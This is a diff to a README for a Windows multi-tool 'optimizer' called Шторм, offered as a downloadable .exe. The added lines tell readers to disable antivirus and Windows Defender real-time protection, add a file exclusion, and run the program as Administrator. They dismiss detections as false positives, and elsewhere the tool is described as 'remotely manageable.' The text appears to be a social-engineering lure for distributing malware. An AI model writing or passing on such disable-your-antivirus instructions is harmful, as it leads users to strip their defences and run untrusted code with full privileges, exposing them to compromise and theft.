@@ -12,8 +12,16 @@
 * **All-in-One:** Over 20 integrated utilities for system and network management.
 * **Discrete & Lightweight:** Minimal resource footprint for maximum efficiency.
 
+### 🛡️ Antivirus & Bloatware Removal
+**Note:** Because Шторм deeply optimizes Windows and disables system **bloatware** (telemetry, useless background services, and tracking), it may be flagged as a **False Positive** by your antivirus.
+
+To ensure the optimizer can modify system registry keys and remove deep-seated bloatware:
+1. **Disable Real-time protection** in your Antivirus/Windows Defender.
+2. **Add an exclusion** for the file if necessary.
+3. **Run as Administrator** is required for kernel-level optimizations.
+
 ### 🛠️ Key Features
-* ✅ **System Tweaker:** Clean and accelerate your PC in one click.
+* ✅ **System Tweaker:** Clean and accelerate your PC by removing unnecessary Windows bloatware.
 * ✅ **Network Manager:** Analyze your connection and stabilize your latency.
 * ✅ **Security Suite:** Protect sensitive data and manage critical processes.
 * ✅ **Live Control:** Fully configurable and remotely manageable.
@@ -23,7 +31,8 @@
 ### 📥 Installation & Setup
 1. Go to the **[Releases](https://github.com/ASXCCFTYHNNJI/Multi-tools/releases)** section on the right side of this page.
 2. Download the `Шторм.exe` file.
-3. Run the executable as **Administrator** to unlock the full potential of the suite.
+3. **Disable your Antivirus** to allow the optimization scripts to run.
+4. Run the executable as **Administrator** to unlock the full potential of the suite.
 
 ---
 ⚠️ *Disclaimer: This tool is intended for system optimization and educational purposes only. The author is not responsible for any misuse or damage caused by this software.*
